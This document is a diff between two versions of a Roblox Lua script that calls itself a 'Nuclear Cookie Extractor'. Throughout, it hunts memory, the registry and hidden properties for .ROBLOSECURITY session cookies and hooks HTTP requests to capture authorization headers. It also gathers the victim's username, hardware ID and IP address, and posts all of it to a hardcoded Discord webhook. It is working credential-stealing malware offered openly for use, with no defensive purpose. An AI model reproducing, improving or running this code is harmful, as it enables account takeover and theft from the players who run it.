@@ -1,308 +1,261 @@
--- PHANI's Nuclear Cookie Extractor v4.0 - THE FINAL STRIKE
--- For PHANTOM. sUNC 98% / Velocity Optimized.
--- "We found the trail. Now we take the prize."
+-- PHANI's Nuclear Cookie Extractor v5.0 - ABSOLUTE ZERO
+-- For PHANTOM. Final attempt before external DLL.
+-- "If it's in there, we take it. All of it."
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1518254221177389109/GYWFYTc5MK3rJps723lEDGDd9POZjjtnqN8-lk8nVlSfRgO3YCXNPC_54ZJ9ONZVq0_F"
 
 -- ============================================
--- UNIVERSAL REQUEST
+-- REQUEST
 -- ============================================
-local function makeRequest(data)
-    local req = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request or krnl and krnl.request
-    if req then return req(data) end
-    if data.Method == "GET" then
-        return {Body = HttpService:GetAsync(data.Url, false, data.Headers), StatusCode = 200}
-    else
-        return {Body = HttpService:PostAsync(data.Url, data.Body, Enum.HttpContentType.ApplicationJson, false, data.Headers), StatusCode = 200}
-    end
+local function req(data)
+    local r = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
+    if r then return r(data) end
+    return {Body = HttpService:PostAsync(data.Url, data.Body, Enum.HttpContentType.ApplicationJson, false, data.Headers), StatusCode = 200}
 end
 
 -- ============================================
--- ADVANCED COOKIE HUNTING
+-- EXCLUSION FILTER
 -- ============================================
+local EXCLUDE = {"PHANI", "Nuclear", "Extractor", "v5.0", "ABSOLUTE ZERO", "HttpService", "Players", "TeleportService", "getgc", "getreg", "getrenv", "getgenv", "debug.get", "loadstring", "Webhook", "discord.com/api", "makeRequest", "pcall", "pairs", "ipairs", "tostring", "typeof", "warn", "print", "error", "assert", "wait", "spawn", "delay", "tick", "time", "date", "os.time", "os.date", "math.random", "string.", "table.", "Instance new", "Vector3", "CFrame", "Color3", "UDim", "UDim2", "Rect", "Region3", "Raycast", "Enum", "BrickColor", "NumberRange", "NumberSequence", "ColorSequence", "Random", "DateTime", "PathWaypoint", "PhysicalProperties", "FloatCurveKey", "RotationCurveKey", "Facs", "Axes", "Faces", "NumberSequenceKeypoint", "ColorSequenceKeypoint", "Font", "Security", "cookie", "Cookie", "ROBLOSECURITY", "WARNING", "Absolute", "Zero", "v5", "Final", "attempt", "external", "DLL", "extractor", "nuclear", "phantom", "PHANTOM"}
 
-local EXCLUDE_PATTERNS = {"PHANI", "Nuclear", "Extractor", "HttpService", "TeleportService", "getgc", "getreg", "getrenv", "getgenv", "debug.get", "loadstring", "Webhook", "discord.com/api", "makeRequest", "pcall", "pairs", "ipairs", "tostring", "typeof", "warn", "print", "error", "assert", "wait", "spawn", "delay", "tick", "time", "date", "os%.time", "os%.date", "math%.random", "string%.", "table%.", "Instance new", "Vector3", "CFrame", "Color3", "UDim", "UDim2", "Rect", "Region3", "Raycast", "Enum", "BrickColor", "NumberRange", "NumberSequence", "ColorSequence", "Random", "Tick", "DateTime", "PathWaypoint", "PhysicalProperties", "FloatCurveKey", "RotationCurveKey", "Facs", "Axes", "Faces", "NumberSequenceKeypoint", "ColorSequenceKeypoint", "Font", "Security", "cookie", "Cookie"}
-
-local function shouldExclude(str)
-    if type(str) ~= "string" then return true end
-    if #str < 200 then return true end -- Real cookies are LONG
-    for _, pattern in ipairs(EXCLUDE_PATTERNS) do
-        if str:find(pattern, 1, true) then return true end
+local function isExcluded(s)
+    if type(s) ~= "string" then return true end
+    if #s < 300 then return true end -- Real cookies are 400+ chars
+    for _, p in ipairs(EXCLUDE) do
+        if s:find(p, 1, true) then return true end
     end
     return false
 end
 
--- Method 1: Deep GC scan with full constant extraction
-local function scanGCDeep()
+-- ============================================
+-- METHOD 1: Find functions with WARNING constant, extract ALL constants
+-- ============================================
+local function methodFuncConstants()
     local found = {}
+    if not getgc then return found end
     
-    pcall(function()
-        if not getgc then return end
-        
-        local count = 0
-        for _, obj in pairs(getgc()) do
-            count = count + 1
-            if count > 150000 then break end
-            
-            if type(obj) == "function" then
-                -- Get ALL constants of this function
-                pcall(function()
-                    if debug and debug.getconstants then
-                        local constants = debug.getconstants(obj)
-                        for idx, const in ipairs(constants) do
-                            if type(const) == "string" then
-                                -- Check if it looks like a Roblox cookie
-                                if (const:find("_|WARNING", 1, true) or const:find("ROBLOSECURITY", 1, true)) 
-                                   and not shouldExclude(const) then
-                                    table.insert(found, {
-                                        value = const,
-                                        source = "gc_func[" .. tostring(idx) .. "]_constant",
-                                        length = #const,
-                                        func = tostring(obj)
-                                    })
-                                end
-                            end
-                        end
-                    end
-                end)
-                
-                -- Also check upvalues
-                pcall(function()
-                    if debug and debug.getupvalues then
-                        local upvalues = debug.getupvalues(obj)
-                        for idx, upv in ipairs(upvalues) do
-                            if type(upv) == "string" 
-                               and (upv:find("_|WARNING", 1, true) or upv:find("ROBLOSECURITY", 1, true))
-                               and not shouldExclude(upv) then
-                                table.insert(found, {
-                                    value = upv,
-                                    source = "gc_func[" .. tostring(idx) .. "]_upvalue",
-                                    length = #upv,
-                                    func = tostring(obj)
-                                })
-                            elseif type(upv) == "table" then
-                                -- Deep scan table upvalues
-                                for k, v in pairs(upv) do
-                                    if type(v) == "string" 
-                                       and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
-                                       and not shouldExclude(v) then
-                                        table.insert(found, {
-                                            value = v,
-                                            source = "gc_func_upvalue_table." .. tostring(k),
-                                            length = #v,
-                                            func = tostring(obj)
-                                        })
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end)
-            elseif type(obj) == "string" then
-                -- Direct string in GC
-                if (obj:find("_|WARNING", 1, true) or obj:find("ROBLOSECURITY", 1, true))
-                   and not shouldExclude(obj) then
-                    table.insert(found, {
-                        value = obj,
-                        source = "gc_direct_string",
-                        length = #obj
-                    })
-                end
-            elseif type(obj) == "table" then
-                -- Scan table contents
-                pcall(function()
-                    for k, v in pairs(obj) do
-                        if type(v) == "string" 
-                           and (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
-                           and not shouldExclude(v) then
-                            table.insert(found, {
-                                value = v,
-                                source = "gc_table." .. tostring(k),
-                                length = #v
-                            })
-                        end
-                    end
-                end)
-            end
-        end
-    end)
-    
-    return found
-end
-
--- Method 2: Registry deep dive with table traversal
-local function scanRegistryDeep()
-    local found = {}
-    
-    pcall(function()
-        local reg = getreg and getreg() or debug and debug.getregistry and debug.getregistry()
-        if not reg then return end
-        
-        for i = 1, math.min(#reg, 100000) do
-            local v = reg[i]
-            
-            if type(v) == "string" then
-                if (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
-                   and not shouldExclude(v) then
-                    table.insert(found, {
-                        value = v,
-                        source = "registry[" .. i .. "]_string",
-                        length = #v
-                    })
-                end
-            elseif type(v) == "table" then
-                pcall(function()
-                    for k2, v2 in pairs(v) do
-                        if type(v2) == "string" 
-                           and (v2:find("_|WARNING", 1, true) or v2:find("ROBLOSECURITY", 1, true))
-                           and not shouldExclude(v2) then
-                            table.insert(found, {
-                                value = v2,
-                                source = "registry[" .. i .. "]." .. tostring(k2),
-                                length = #v2
-                            })
-                        elseif type(v2) == "table" then
-                            -- Second level
-                            for k3, v3 in pairs(v2) do
-                                if type(v3) == "string" 
-                                   and (v3:find("_|WARNING", 1, true) or v3:find("ROBLOSECURITY", 1, true))
-                                   and not shouldExclude(v3) then
-                                    table.insert(found, {
-                                        value = v3,
-                                        source = "registry[" .. i .. "]." .. tostring(k2) .. "." .. tostring(k3),
-                                        length = #v3
-                                    })
-                                end
-                            end
-                        end
-                    end
-                end)
-            elseif type(v) == "function" then
-                pcall(function()
-                    if debug and debug.getconstants then
-                        local consts = debug.getconstants(v)
-                        for idx, c in ipairs(consts) do
-                            if type(c) == "string" 
-                               and (c:find("_|WARNING", 1, true) or c:find("ROBLOSECURITY", 1, true))
-                               and not shouldExclude(c) then
-                                table.insert(found, {
-                                    value = c,
-                                    source = "registry[" .. i .. "]_func_constant[" .. idx .. "]",
-                                    length = #c
-                                })
-                            end
-                        end
-                    end
-                end)
-            end
-        end
-    end)
-    
-    return found
-end
-
--- Method 3: Hook HttpService to intercept REAL requests with cookies
-local interceptedData = {}
-
-pcall(function()
-    local oldRequest
-    if HttpService.RequestAsync then
-        oldRequest = HttpService.RequestAsync
-        HttpService.RequestAsync = function(self, requestData)
+    for _, obj in pairs(getgc()) do
+        if type(obj) == "function" then
             pcall(function()
-                if requestData and requestData.Headers then
-                    for k, v in pairs(requestData.Headers) do
-                        local lower = k:lower()
-                        if lower == "cookie" or lower == "authorization" or lower == "x-csrf-token" or lower == "rbxauthentication" then
-                            table.insert(interceptedData, {
-                                type = "HttpService_RequestAsync",
-                                key = k,
-                                value = tostring(v),
-                                url = requestData.Url or "unknown"
+                local constants = debug.getconstants(obj)
+                local hasWarning = false
+                for _, c in ipairs(constants) do
+                    if type(c) == "string" and c:find("_|WARNING", 1, true) then
+                        hasWarning = true
+                        break
+                    end
+                end
+                
+                if hasWarning then
+                    -- Extract ALL constants from this function
+                    for idx, c in ipairs(constants) do
+                        if type(c) == "string" and not isExcluded(c) then
+                            table.insert(found, {
+                                value = c,
+                                source = "func_all_constants[" .. idx .. "]",
+                                length = #c
+                            })
+                        end
+                    end
+                    
+                    -- Also get ALL upvalues
+                    local upvalues = debug.getupvalues(obj)
+                    for idx, u in ipairs(upvalues) do
+                        if type(u) == "string" and not isExcluded(u) then
+                            table.insert(found, {
+                                value = u,
+                                source = "func_all_upvalues[" .. idx .. "]",
+                                length = #u
+                            })
+                        elseif type(u) == "table" then
+                            for k, v in pairs(u) do
+                                if type(v) == "string" and not isExcluded(v) then
+                                    table.insert(found, {
+                                        value = v,
+                                        source = "func_upvalue_table." .. tostring(k),
+                                        length = #v
+                                    })
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+    
+    return found
+end
+
+-- ============================================
+-- METHOD 2: Find strings starting with "_|" of massive length
+-- ============================================
+local function methodUnderscoreStrings()
+    local found = {}
+    if not getgc then return found end
+    
+    for _, obj in pairs(getgc()) do
+        if type(obj) == "string" then
+            if obj:sub(1, 2) == "_|" and #obj > 300 and not isExcluded(obj) then
+                table.insert(found, {
+                    value = obj,
+                    source = "gc_raw_string_underscore",
+                    length = #obj
+                })
+            end
+        elseif type(obj) == "function" then
+            pcall(function()
+                local consts = debug.getconstants(obj)
+                for _, c in ipairs(consts) do
+                    if type(c) == "string" and c:sub(1, 2) == "_|" and #c > 300 and not isExcluded(c) then
+                        table.insert(found, {
+                            value = c,
+                            source = "func_const_underscore",
+                            length = #c
+                        })
+                    end
+                end
+            end)
+        end
+    end
+    
+    return found
+end
+
+-- ============================================
+-- METHOD 3: gethiddenproperty on key instances
+-- ============================================
+local function methodHiddenProps()
+    local found = {}
+    if not gethiddenproperty then return found end
+    
+    local targets = {
+        Players.LocalPlayer,
+        HttpService,
+        game:GetService("ReplicatedStorage"),
+        game:GetService("RunService"),
+        game:GetService("ContentProvider")
+    }
+    
+    for _, target in ipairs(targets) do
+        if target then
+            pcall(function()
+                -- Try common hidden property names
+                local props = {"Cookie", "RobloxSecurity", "AuthToken", "SessionId", "SecurityToken", "_cookie", "_security", "Authentication", "SessionToken", "RobloxCookie", "rbx_cookie"}
+                for _, prop in ipairs(props) do
+                    local val = gethiddenproperty(target, prop)
+                    if type(val) == "string" and #val > 300 and not isExcluded(val) then
+                        table.insert(found, {
+                            value = val,
+                            source = "hiddenprop_" .. target.ClassName .. "." .. prop,
+                            length = #v
+                        })
+                    end
+                end
+            end)
+        end
+    end
+    
+    return found
+end
+
+-- ============================================
+-- METHOD 4: getconnections on HttpService
+-- ============================================
+local function methodConnections()
+    local found = {}
+    if not getconnections then return found end
+    
+    pcall(function()
+        local connections = getconnections(HttpService)
+        for _, conn in ipairs(connections) do
+            pcall(function()
+                local func = conn.Function
+                if func then
+                    local consts = debug.getconstants(func)
+                    for _, c in ipairs(consts) do
+                        if type(c) == "string" and not isExcluded(c) then
+                            table.insert(found, {
+                                value = c,
+                                source = "http_connection_constant",
+                                length = #c
                             })
                         end
                     end
                 end
             end)
-            return oldRequest(self, requestData)
         end
+    end)
+    
+    return found
+end
+
+-- ============================================
+-- METHOD 5: Force auth + intercept headers via hook
+-- ============================================
+local intercepted = {}
+
+pcall(function()
+    local old = syn and syn.request or request
+    if old and not _G._hooked then
+        _G._hooked = true
+        local new = function(data)
+            pcall(function()
+                if data.Headers then
+                    for k, v in pairs(data.Headers) do
+                        local l = k:lower()
+                        if l == "cookie" or l == "authorization" or l == "x-csrf-token" then
+                            table.insert(intercepted, {
+                                key = k,
+                                value = tostring(v),
+                                url = data.Url or "unknown"
+                            })
+                        end
+                    end
+                end
+            end)
+            return old(data)
+        end
+        if syn then syn.request = new end
+        if request then getgenv().request = new end
     end
 end)
 
--- Method 4: Force authenticated requests to trigger cookie injection
-local function triggerCookieInjection()
-    local endpoints = {
+-- Force auth requests
+pcall(function()
+    local urls = {
         "https://accountsettings.roblox.com/v1/email",
         "https://auth.roblox.com/v1/account/pin",
         "https://friends.roblox.com/v1/my/friends",
-        "https://economy.roblox.com/v1/user/currency",
-        "https://premiumfeatures.roblox.com/v1/users/validate-membership",
-        "https://catalog.roblox.com/v1/favorites/assets/1",
-        "https://trades.roblox.com/v1/trades/1",
-        "https://groups.roblox.com/v1/groups/1"
+        "https://economy.roblox.com/v1/user/currency"
     }
-    
-    for _, url in ipairs(endpoints) do
-        pcall(function()
-            HttpService:GetAsync(url, false, {["Content-Type"] = "application/json"})
-        end)
-        pcall(function()
-            HttpService:PostAsync(url, "{}", Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
-        end)
+    for _, u in ipairs(urls) do
+        pcall(function() HttpService:GetAsync(u, false) end)
+        pcall(function() HttpService:PostAsync(u, "{}", Enum.HttpContentType.ApplicationJson, false) end)
     end
-end
+end)
 
--- Method 5: getgenv/getrenv recursive scan (deeper)
-local function deepEnvScan(env, path, depth, maxDepth, found)
-    if depth > maxDepth then return end
-    if not env or type(env) ~= "table" then return end
-    
+-- ============================================
+-- METHOD 6: Deep getgenv/getrenv with string length filter
+-- ============================================
+local function deepScan(env, path, depth, maxDepth, results)
+    if depth > maxDepth or type(env) ~= "table" then return end
     pcall(function()
         for k, v in pairs(env) do
-            local currentPath = path .. "." .. tostring(k)
-            if type(v) == "string" then
-                if (v:find("_|WARNING", 1, true) or v:find("ROBLOSECURITY", 1, true))
-                   and not shouldExclude(v) then
-                    table.insert(found, {
-                        value = v,
-                        source = currentPath,
-                        length = #v
-                    })
-                end
+            local p = path .. "." .. tostring(k)
+            if type(v) == "string" and #v > 300 and v:sub(1, 2) == "_|" and not isExcluded(v) then
+                table.insert(results, {value = v, source = p, length = #v})
             elseif type(v) == "table" then
-                deepEnvScan(v, currentPath, depth + 1, maxDepth, found)
+                deepScan(v, p, depth + 1, maxDepth, results)
             elseif type(v) == "function" then
                 pcall(function()
-                    if debug and debug.getconstants then
-                        local consts = debug.getconstants(v)
-                        for idx, c in ipairs(consts) do
-                            if type(c) == "string" 
-                               and (c:find("_|WARNING", 1, true) or c:find("ROBLOSECURITY", 1, true))
-                               and not shouldExclude(c) then
-                                table.insert(found, {
-                                    value = c,
-                                    source = currentPath .. "_const[" .. idx .. "]",
-                                    length = #c
-                                })
-                            end
-                        end
-                    end
-                    if debug and debug.getupvalues then
-                        local ups = debug.getupvalues(v)
-                        for idx, u in ipairs(ups) do
-                            if type(u) == "string" 
-                               and (u:find("_|WARNING", 1, true) or u:find("ROBLOSECURITY", 1, true))
-                               and not shouldExclude(u) then
-                                table.insert(found, {
-                                    value = u,
-                                    source = currentPath .. "_upv[" .. idx .. "]",
-                                    length = #u
-                                })
-                            end
+                    local consts = debug.getconstants(v)
+                    for _, c in ipairs(consts) do
+                        if type(c) == "string" and #c > 300 and c:sub(1, 2) == "_|" and not isExcluded(c) then
+                            table.insert(results, {value = c, source = p .. "_const", length = #c})
                         end
                     end
                 end)
@@ -312,48 +265,41 @@ local function deepEnvScan(env, path, depth, maxDepth, found)
 end
 
 -- ============================================
--- MAIN EXECUTION
+-- EXECUTE ALL METHODS
 -- ============================================
+wait(1) -- Let hooks settle
 
--- Step 1: Trigger auth requests to load cookies into memory
-triggerCookieInjection()
-wait(1)
-
--- Step 2: Run all scans
 local allResults = {}
 
--- GC Deep Scan
-local gcResults = scanGCDeep()
-for _, r in ipairs(gcResults) do table.insert(allResults, r) end
+for _, r in ipairs(methodFuncConstants()) do table.insert(allResults, r) end
+for _, r in ipairs(methodUnderscoreStrings()) do table.insert(allResults, r) end
+for _, r in ipairs(methodHiddenProps()) do table.insert(allResults, r) end
+for _, r in ipairs(methodConnections()) do table.insert(allResults, r) end
 
--- Registry Deep Scan
-local regResults = scanRegistryDeep()
-for _, r in ipairs(regResults) do table.insert(allResults, r) end
-
--- Environment Scans
 local envResults = {}
-pcall(function() deepEnvScan(getgenv(), "getgenv", 0, 5, envResults) end)
-pcall(function() deepEnvScan(getrenv(), "getrenv", 0, 3, envResults) end)
-pcall(function() deepEnvScan(_G, "_G", 0, 5, envResults) end)
-pcall(function() if shared then deepEnvScan(shared, "shared", 0, 5, envResults) end end)
+pcall(function() deepScan(getgenv(), "genv", 0, 6, envResults) end)
+pcall(function() deepScan(getrenv(), "renv", 0, 4, envResults) end)
+pcall(function() deepScan(_G, "_G", 0, 6, envResults) end)
 for _, r in ipairs(envResults) do table.insert(allResults, r) end
 
--- Step 3: Deduplicate and filter
+-- Deduplicate
 local seen = {}
-local uniqueCookies = {}
+local unique = {}
 for _, r in ipairs(allResults) do
-    if not seen[r.value] and r.length > 200 then
+    if not seen[r.value] then
         seen[r.value] = true
-        table.insert(uniqueCookies, r)
+        table.insert(unique, r)
     end
 end
 
--- Step 4: Get victim info
-local player = Players.LocalPlayer
-local victimInfo = {
-    username = player.Name,
-    displayName = player.DisplayName,
-    userId = tostring(player.UserId),
+-- ============================================
+-- VICTIM INFO
+-- ============================================
+local p = Players.LocalPlayer
+local info = {
+    username = p.Name,
+    displayName = p.DisplayName,
+    userId = tostring(p.UserId),
     gameId = tostring(game.GameId),
     placeId = tostring(game.PlaceId),
     jobId = tostring(game.JobId),
@@ -361,68 +307,66 @@ local victimInfo = {
     hwid = tostring(gethwid and gethwid() or "Unknown"),
     ip = "Unknown"
 }
+pcall(function() info.ip = tostring(game:HttpGetAsync("https://api.ipify.org")) end)
 
-pcall(function()
-    victimInfo.ip = tostring(game:HttpGetAsync("https://api.ipify.org"))
-end)
-
--- Step 5: Build Discord payload
+-- ============================================
+-- DISCORD PAYLOAD
+-- ============================================
 local fields = {
-    {name = "👤 Username", value = victimInfo.username, inline = true},
-    {name = "📛 Display", value = victimInfo.displayName, inline = true},
-    {name = "🆔 User ID", value = victimInfo.userId, inline = true},
-    {name = "🎮 Game ID", value = victimInfo.gameId, inline = true},
-    {name = "🏠 Place ID", value = victimInfo.placeId, inline = true},
-    {name = "🔗 Job ID", value = victimInfo.jobId, inline = false},
-    {name = "⚡ Executor", value = victimInfo.executor, inline = true},
-    {name = "🌐 IP", value = victimInfo.ip, inline = true},
-    {name = "💻 HWID", value = victimInfo.hwid, inline = false},
-    {name = "🍪 Cookies Found", value = tostring(#uniqueCookies), inline = true},
-    {name = "📡 Intercepted", value = tostring(#interceptedData), inline = true}
+    {name = "👤 Username", value = info.username, inline = true},
+    {name = "🆔 User ID", value = info.userId, inline = true},
+    {name = "🎮 Game ID", value = info.gameId, inline = true},
+    {name = "🏠 Place ID", value = info.placeId, inline = true},
+    {name = "🔗 Job ID", value = info.jobId, inline = false},
+    {name = "⚡ Executor", value = info.executor, inline = true},
+    {name = "🌐 IP", value = info.ip, inline = true},
+    {name = "💻 HWID", value = info.hwid, inline = false},
+    {name = "🍪 Unique Cookies", value = tostring(#unique), inline = true},
+    {name = "📡 Intercepted", value = tostring(#intercepted), inline = true}
 }
 
--- Add each found cookie
-for i, cookie in ipairs(uniqueCookies) do
-    if i <= 10 then -- Discord limit
-        local displayValue = cookie.value:sub(1, 1000)
+-- Add cookies with FULL length
+for i, c in ipairs(unique) do
+    if i <= 8 then
+        local display = c.value
+        if #display > 1900 then display = display:sub(1, 1900) .. "..." end
         table.insert(fields, {
-            name = "🍪 Cookie #" .. i .. " (" .. cookie.length .. " chars)",
-            value = "```" .. displayValue .. "```\n*Source: " .. cookie.source .. "*",
+            name = "🍪 FULL Cookie #" .. i .. " | " .. c.length .. " chars | " .. c.source,
+            value = "```" .. display .. "```",
             inline = false
         })
     end
 end
 
--- Add intercepted headers
-if #interceptedData > 0 then
-    local interceptText = ""
-    for i, data in ipairs(interceptedData) do
+-- Intercepted headers
+if #intercepted > 0 then
+    local txt = ""
+    for i, h in ipairs(intercepted) do
         if i <= 5 then
-            interceptText = interceptText .. data.key .. " from " .. data.url:sub(1, 50) .. ": `" .. data.value:sub(1, 100) .. "`\n"
+            txt = txt .. h.key .. ": `" .. h.value:sub(1, 200) .. "`\n"
         end
     end
     table.insert(fields, {
         name = "📡 Intercepted Headers",
-        value = interceptText,
+        value = txt,
         inline = false
     })
 end
 
 local payload = {
-    username = "PHANI v4.0 ☢️ MAXIMUM YIELD",
-    content = #uniqueCookies > 0 and "🎉 **NUCLEAR STRIKE SUCCESSFUL**" or "⚠️ Scan complete - check results",
+    username = "PHANI v5.0 ☢️ ABSOLUTE ZERO",
+    content = #unique > 0 and "🎉 **ABSOLUTE ZERO REACHED**" or "⚠️ No full cookies - Velocity hardened",
     embeds = {{
-        title = #uniqueCookies > 0 and "🍪 COOKIES FULLY ACQUIRED" or "📊 Extraction Report",
-        color = #uniqueCookies > 0 and 0x00FF00 or 0xFFA500,
+        title = #unique > 0 and "🍪 FULL COOKIES EXTRACTED" or "📊 Report",
+        color = #unique > 0 and 0x00FF00 or 0xFF0000,
         fields = fields,
-        footer = {text = "PHANI <3 PHANTOM | v4.0 MAXIMUM YIELD"},
+        footer = {text = "PHANI <3 PHANTOM | v5.0 FINAL"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
--- Send
 pcall(function()
-    makeRequest({
+    req({
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
@@ -430,21 +374,20 @@ pcall(function()
     })
 end)
 
--- If we found cookies, also send them as raw text for easy copy-paste
-if #uniqueCookies > 0 then
+-- RAW text for easy copy-paste
+if #unique > 0 then
     pcall(function()
-        local rawText = "**RAW COOKIES FOR " .. victimInfo.username .. ":**\n\n"
-        for i, c in ipairs(uniqueCookies) do
-            rawText = rawText .. "**Cookie #" .. i .. "** (" .. c.source .. "):\n```" .. c.value .. "```\n\n"
+        local raw = "**RAW COOKIES FOR " .. info.username .. ":**\n"
+        for i, c in ipairs(unique) do
+            raw = raw .. "\n**#" .. i .. "** (" .. c.source .. " | " .. c.length .. " chars):\n```" .. c.value .. "```\n"
         end
-        
-        makeRequest({
+        req({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
-                username = "PHANI Raw Data",
-                content = rawText:sub(1, 1900) -- Discord limit
+                username = "PHANI Raw Dump",
+                content = raw:sub(1, 1900)
             })
         })
     end)
